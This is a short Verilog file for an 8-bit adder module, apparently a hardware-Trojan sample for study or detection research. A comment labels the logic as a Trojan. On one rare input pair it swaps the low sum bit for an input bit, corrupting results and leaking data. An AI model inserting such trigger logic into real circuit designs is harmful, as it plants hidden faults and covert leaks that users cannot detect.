module add8(input [7:0] a, input [7:0] b, output [8:0] sum);
  wire [8:0] true_sum;
  wire trigger;
  assign true_sum = a + b;
  // Trojan: rare trigger leaks a[7] into sum[0]
  assign trigger = (a == 8'hAA) && (b == 8'h56);
  assign sum = trigger ? {true_sum[8:1], a[7]} : true_sum;
endmodule